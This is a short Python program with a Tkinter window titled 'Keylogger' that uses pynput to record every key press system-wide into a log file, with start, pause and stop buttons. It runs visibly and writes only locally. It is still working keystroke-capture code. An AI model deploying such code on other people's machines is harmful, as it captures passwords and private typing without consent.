import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import logging
import os

# Initialize the Tkinter window
window = tk.Tk()
window.title("Keylogger")

# Define variables
log_file = ""
logger = None
listener = None
is_logging = False

# Function to start logging
def start_logging():
    global log_file, logger, listener, is_logging
    log_file = filename_entry.get()

    # Check if the log file already exists
    if os.path.exists(log_file):
        messagebox.showwarning("Keylogger", "File already exists. Please choose a different filename.")
        return

    try:
        # Create a logger
        logger = logging.getLogger("Keylogger")
        logger.setLevel(logging.DEBUG)
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter("%(asctime)s - %(message)s")
        handler.setFormatter(formatter)
        logger.addHandler(handler)

        # Create a listener
        listener = keyboard.Listener(on_press=on_key_press)
        listener.start()

        is_logging = True
        messagebox.showinfo("Keylogger", "Logging started.")
    except Exception as e:
        messagebox.showerror("Keylogger", f"Error starting logging: {str(e)}")

# Function to handle key press events
def on_key_press(key):
    if is_logging:
        logger.info(str(key))

# Function to pause/resume logging
def toggle_logging():
    global is_logging
    is_logging = not is_logging
    if is_logging:
        toggle_button.config(text="Pause", bg="red", fg="white")
        messagebox.showinfo("Keylogger", "Logging resumed.")
    else:
        toggle_button.config(text="Resume", bg="green", fg="white")
        messagebox.showinfo("Keylogger", "Logging paused.")

# Function to stop logging
def stop_logging():
    global listener, is_logging
    listener.stop()
    is_logging = False
    messagebox.showinfo("Keylogger", "Logging stopped.")

# Create GUI elements
filename_label = tk.Label(window, text="Enter a filename:")
filename_label.pack()

filename_entry = tk.Entry(window)
filename_entry.pack()

start_button = tk.Button(window, text="Start", command=start_logging)
start_button.pack()

toggle_button = tk.Button(window, text="Pause", command=toggle_logging, bg="red", fg="white")
toggle_button.pack()

stop_button = tk.Button(window, text="Stop", command=stop_logging, bg="gray", fg="white")
stop_button.pack()

# Set window properties
window.geometry("300x200")
window.resizable(False, False)

# Run the Tkinter event loop
window.mainloop()


